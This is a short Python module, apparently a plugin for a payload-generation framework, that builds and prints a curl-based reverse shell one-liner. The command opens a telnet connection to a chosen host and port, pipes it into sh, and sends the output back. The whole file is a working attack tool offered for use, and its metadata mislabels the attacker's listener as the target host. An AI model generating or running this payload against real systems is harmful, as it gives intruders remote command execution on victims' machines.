#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Curl-based reverse shell tool
metadata = {
    "name": "CurlShell Reverse Shell",
    "description": "A Curl-based reverse shell that establishes a connection to execute commands remotely via telnet.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "http",
        },
    },
}


class Encoder:
    pass


def run(args):
    """Execute the Curl-based reverse shell based on provided arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    # Generate the Curl-based reverse shell command
    powershell_script = f"C='curl -Ns telnet://{lhost}:{lport}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null"
    print(powershell_script)
